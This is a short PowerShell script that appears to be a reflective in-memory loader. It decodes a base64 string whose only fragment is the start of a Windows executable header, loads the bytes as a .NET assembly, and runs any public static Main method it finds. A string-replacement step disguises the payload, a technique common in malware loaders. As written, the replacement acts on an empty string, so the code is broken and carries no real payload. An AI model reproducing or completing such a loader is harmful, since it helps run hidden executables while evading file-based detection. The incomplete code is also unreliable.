$result = ""
$result = $result -replace "hello", "TVqQAAMAAAAEAAAA"

# Convert base64 string to byte array
$bytes = [System.Convert]::FromBase64String($result)

# Load the assembly from the byte array
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Get the types from the loaded assembly
$types = $assembly.GetTypes()

# Find and execute the main method from the types
foreach ($type in $types) {
    $methods = $type.GetMethods([System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
    foreach ($method in $methods) {
        if ($method.Name -eq 'Main') {
            # Invoke the Main method
            $result = $method.Invoke($null, @())
            Write-Host "Main method executed with result: $result"
        }
    }
}

